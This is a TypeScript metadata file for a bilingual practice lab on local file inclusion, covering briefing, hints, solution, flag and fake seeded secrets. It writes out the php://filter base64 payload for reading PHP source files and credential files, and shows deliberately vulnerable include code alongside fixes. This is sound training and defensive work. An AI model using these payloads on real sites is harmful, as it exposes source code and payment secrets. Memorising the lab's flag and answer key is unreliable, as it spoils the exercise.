// src/modules/practice-labs/file-inclusion/labs/lab2/lab2.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lfiLab2Metadata: LabMetadata = {
  slug: 'lfi-php-wrapper-filter-invoice-generator',
  title:
    'File Inclusion: PHP Stream Wrappers — Invoice Generator Source Disclosure',
  ar_title: 'تضمين الملفات: PHP Stream Wrappers — كشف مصدر مولّد الفواتير',
  description:
    'Exploit LFI with PHP stream wrappers in an invoice generation system. Use php://filter/convert.base64-encode/resource= to read PHP source files as base64 — bypassing any PHP execution and revealing application source code with hardcoded secrets.',
  ar_description:
    'استغل LFI مع PHP stream wrappers في نظام توليد فواتير. استخدم php://filter/convert.base64-encode/resource= لقراءة ملفات PHP المصدرية بصيغة base64 — تجاوز تنفيذ PHP وكشف كود المصدر مع الأسرار المضمّنة.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: [
    'Local File Inclusion',
    'PHP Stream Wrappers',
    'Source Code Disclosure',
    'php://filter',
    'Base64 Encoding Bypass',
  ],
  xpReward: 250,
  pointsReward: 125,
  duration: 40,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'The invoice system loads templates via a file parameter. Use php://filter/convert.base64-encode/resource=../config/payment.php to read the payment gateway source file as base64. Decode it to find the Stripe secret key and the flag.',
  ar_goal:
    'يحمّل نظام الفواتير القوالب عبر معامل file. استخدم php://filter/convert.base64-encode/resource=../config/payment.php لقراءة ملف مصدر بوابة الدفع بصيغة base64. فكّ تشفيره لإيجاد مفتاح Stripe السري والعلم.',

  briefing: {
    en: `BillPro — invoice generation platform. Clients, amounts, due dates.
GET /invoice/render?file=templates/invoice_basic
Returns the rendered invoice HTML.
You try: file=templates/invoice_standard — works.
file=../config/database — what happens?
The server tries to read it as PHP. It executes.
You get an empty response. PHP executed silently.
The file exists. But you can't read the source.
PHP wrappers.
php://filter is a meta-wrapper.
php://filter/convert.base64-encode/resource=<path>
It reads the file. But BEFORE returning it —
it converts the content to base64.
PHP doesn't execute base64 strings.
You get the raw source code. As base64.
file=php://filter/convert.base64-encode/resource=../config/payment.php
The server returns a base64 string.
You decode it.
<?php
define("STRIPE_SECRET_KEY", "sk_live_billpro_SECRET_xyz789");
// FLAG: FLAG{LFI_PHP_WRAPPER_FILTER_SOURCE_DISCLOSURE_PAYMENT}
?>
Every secret. In plaintext.`,
    ar: `BillPro — منصة توليد فواتير. عملاء، مبالغ، تواريخ استحقاق.
GET /invoice/render?file=templates/invoice_basic
يُعيد HTML الفاتورة المُرندَرة.
تجرب: file=templates/invoice_standard — يعمل.
file=../config/database — ماذا يحدث؟
الخادم يحاول قراءته كـ PHP. ينفّذه.
تحصل على استجابة فارغة. PHP نُفِّذ بصمت.
الملف موجود. لكن لا يمكنك قراءة المصدر.
PHP wrappers.
php://filter هو meta-wrapper.
php://filter/convert.base64-encode/resource=<path>
يقرأ الملف. لكن قبل إعادته —
يحوّل المحتوى إلى base64.
PHP لا تُنفِّذ سلاسل base64.
تحصل على الكود المصدري الخام. كـ base64.
file=php://filter/convert.base64-encode/resource=../config/payment.php
الخادم يُعيد سلسلة base64.
تفكّها.
<?php
define("STRIPE_SECRET_KEY", "sk_live_billpro_SECRET_xyz789");
// FLAG: FLAG{LFI_PHP_WRAPPER_FILTER_SOURCE_DISCLOSURE_PAYMENT}
?>
كل سر. كنص عادي.`,
  },

  stepsOverview: {
    en: [
      'GET /invoice/render?file=templates/invoice_basic — confirm normal functionality',
      'Test path traversal: file=../config/database — server likely returns empty (PHP executes silently)',
      'Apply php://filter wrapper: file=php://filter/convert.base64-encode/resource=../config/payment.php',
      'Receive base64 string in response — copy it',
      'Decode: atob("<base64>") or Buffer.from("<base64>","base64").toString() → full PHP source revealed',
      'Find STRIPE_SECRET_KEY and FLAG{LFI_PHP_WRAPPER_FILTER_SOURCE_DISCLOSURE_PAYMENT} in source',
    ],
    ar: [
      'GET /invoice/render?file=templates/invoice_basic — أكّد الوظيفة العادية',
      'اختبر اجتياز المسار: file=../config/database — الخادم على الأرجح يُعيد فارغاً (PHP تُنفَّذ بصمت)',
      'طبّق php://filter wrapper: file=php://filter/convert.base64-encode/resource=../config/payment.php',
      'استلم سلسلة base64 في الاستجابة — انسخها',
      'فكّ التشفير: atob("<base64>") أو Buffer.from("<base64>","base64").toString() → مصدر PHP الكامل مكشوف',
      'ابحث عن STRIPE_SECRET_KEY والـ FLAG{LFI_PHP_WRAPPER_FILTER_SOURCE_DISCLOSURE_PAYMENT} في المصدر',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'BillPro /invoice/render reads: includeFile(file). The php://filter meta-wrapper is not blocked. Using convert.base64-encode as a filter chain, the PHP file is read and base64-encoded before being returned — preventing PHP execution while exposing the raw source. The payment.php file contains STRIPE_SECRET_KEY, PAYPAL_SECRET, and the FLAG as a comment.',
    vulnerableCode:
      "// Invoice template loader (vulnerable):\napp.get('/invoice/render', isAuthenticated, async (req, res) => {\n" +
      '  const { file } = req.query;\n' +
      '  // ❌ Accepts PHP wrappers! php://filter, data://, zip:// etc.\n' +
      '  const content = await includeFile(file); // simulates PHP include()\n' +
      '  res.send(content);\n' +
      '});',
    exploitation:
      'GET /invoice/render?file=php://filter/convert.base64-encode/resource=../config/payment.php\n' +
      '→ Response: "PD9waHAKLy8gQmlsbFBybyBQYXltZW50..."\n' +
      '→ Decode: full payment.php source with STRIPE_SECRET + FLAG',
    steps: {
      en: [
        'GET /invoice/render?file=php://filter/convert.base64-encode/resource=../config/payment.php → base64 blob',
        'Decode: Buffer.from(response, "base64").toString() → full payment.php PHP source',
        'Source contains: STRIPE_SECRET_KEY = "sk_live_billpro_SECRET_xyz789"',
        'Source contains: // FLAG: FLAG{LFI_PHP_WRAPPER_FILTER_SOURCE_DISCLOSURE_PAYMENT}',
        'Also: /invoice/render?file=php://filter/convert.base64-encode/resource=../config/database.php → DB credentials',
      ],
      ar: [
        'GET /invoice/render?file=php://filter/convert.base64-encode/resource=../config/payment.php → blob base64',
        'فكّ التشفير: Buffer.from(response, "base64").toString() → مصدر payment.php الكامل',
        'المصدر يحتوي: STRIPE_SECRET_KEY = "sk_live_billpro_SECRET_xyz789"',
        'المصدر يحتوي: // FLAG: FLAG{LFI_PHP_WRAPPER_FILTER_SOURCE_DISCLOSURE_PAYMENT}',
        'أيضاً: /invoice/render?file=php://filter/convert.base64-encode/resource=../config/database.php → بيانات DB',
      ],
    },
    fix: [
      'Block PHP wrapper protocols: if (file.includes("://")) reject — no legitimate template uses a URL wrapper',
      'Allowlist template names: only permit known template identifiers, resolve to full path server-side',
      'path.resolve() jail: verify resolved path starts with the templates base directory',
      'Never hardcode secrets in PHP files: use environment variables (process.env) loaded from a secrets manager',
    ],
  },

  postSolve: {
    explanation: {
      en: 'PHP stream wrappers (php://, data://, zip://, phar://) are powerful built-in protocols that extend file operations. When an LFI accepts user-supplied paths without filtering protocol prefixes, these wrappers become attack tools. php://filter with convert.base64-encode is the standard technique for reading PHP source without triggering execution — the file is read by the filter, encoded, and returned as data. This technique was used to discover hardcoded secrets in hundreds of real bug bounty targets.',
      ar: 'PHP stream wrappers (php://، data://، zip://، phar://) هي بروتوكولات مدمجة قوية تُوسّع عمليات الملفات. عندما يقبل LFI مسارات يُوفّرها المستخدم بدون تصفية بادئات البروتوكول، تصبح هذه الـ wrappers أدوات هجوم. php://filter مع convert.base64-encode هي التقنية القياسية لقراءة مصدر PHP بدون تشغيل التنفيذ — يُقرأ الملف بالفلتر، يُرمَّز، ويُعاد كبيانات. استُخدمت هذه التقنية لاكتشاف أسرار مُرمَّزة في مئات أهداف bug bounty الحقيقية.',
    },
    impact: {
      en: 'The payment.php file contains: Stripe live secret key (sk_live_*) — can charge customers, create refunds, access all transaction data; PayPal client secret — full PayPal API access; webhook secret — replay and forge payment webhooks. Combined with database.php, the attacker has complete financial system access. Stripe live key theft is a critical incident — requires immediate key rotation and incident response.',
      ar: 'يحتوي ملف payment.php على: مفتاح Stripe السري الحي (sk_live_*) — يمكن تحصيل رسوم من العملاء، إنشاء استردادات، الوصول لجميع بيانات المعاملات؛ سر عميل PayPal — وصول كامل لـ PayPal API؛ سر webhook — إعادة تشغيل وتزوير webhooks الدفع. مع database.php، يملك المهاجم وصولاً كاملاً للنظام المالي. سرقة مفتاح Stripe الحي هي حادثة حرجة — تتطلب تدوير فوري للمفتاح والاستجابة للحوادث.',
    },
    fix: [
      'Protocol filtering: const SAFE_PROTOCOLS = /^[a-zA-Z0-9_\\-\\/\\.]+$/; reject anything with "://"',
      'Template ID system: GET /invoice/render?template_id=1 — server maps ID to file path, user never touches the path',
      'Secrets management: NEVER hardcode secrets in source files — use AWS Secrets Manager, HashiCorp Vault, or at minimum environment variables',
      'Disable allow_url_fopen and allow_url_include in php.ini if using PHP',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 15,
      content:
        'Try file: "templates/invoice_basic" — works normally. PHP has special stream wrappers like php://filter. What if you use php://filter as the file parameter? It\'s a protocol handler built into PHP.',
    },
    {
      order: 2,
      xpCost: 30,
      content:
        'php://filter/convert.base64-encode/resource=<path> reads a file and converts it to base64 BEFORE returning. This bypasses PHP execution — you get the raw source code, not its output.',
    },
    {
      order: 3,
      xpCost: 55,
      content:
        'GET /invoice/render?file=php://filter/convert.base64-encode/resource=../config/payment.php → returns a base64 string. Decode it with atob() in browser console or Buffer.from(s,"base64").toString() in Node.',
    },
    {
      order: 4,
      xpCost: 75,
      content:
        'The decoded PHP source contains STRIPE_SECRET_KEY and the FLAG as a comment. Also try resource=../config/database.php for DB credentials.',
    },
  ],

  flagAnswer: 'FLAG{LFI_PHP_WRAPPER_FILTER_SOURCE_DISCLOSURE_PAYMENT}',
  initialState: {
    contents: [
      {
        title: 'PAYMENT_PHP',
        body: '<?php\n// BillPro Payment Gateway Config\ndefine("STRIPE_PUBLIC_KEY", "pk_live_billpro_abc123");\ndefine("STRIPE_SECRET_KEY", "sk_live_billpro_SECRET_xyz789");\ndefine("PAYPAL_CLIENT_ID", "AYSq3RDGsmBLJE-otTkBtM-jBRd1TCQwFf9RGfwznKYgkw2PeWhj");\ndefine("PAYPAL_SECRET", "EGnHDxD_qRPbzbImZyK6b");\n// FLAG: FLAG{LFI_PHP_WRAPPER_FILTER_SOURCE_DISCLOSURE_PAYMENT}\n$webhook_secret = "whsec_billpro_prod_2024";\n?>',
        author: 'php_source',
        isPublic: false,
      },
      {
        title: 'DATABASE_PHP',
        body: '<?php\ndefine("DB_HOST", "db-billpro-prod.internal");\ndefine("DB_USER", "billpro_admin");\ndefine("DB_PASS", "B1llPr0_DB_S3cr3t!");\ndefine("DB_NAME", "billpro_production");\n?>',
        author: 'php_source',
        isPublic: false,
      },
      {
        title: 'INVOICE_BASIC',
        body: '<html><body><h1>Invoice #{{invoice_id}}</h1><p>Amount: {{amount}}</p></body></html>',
        author: 'template_file',
        isPublic: true,
      },
    ],
  },
};
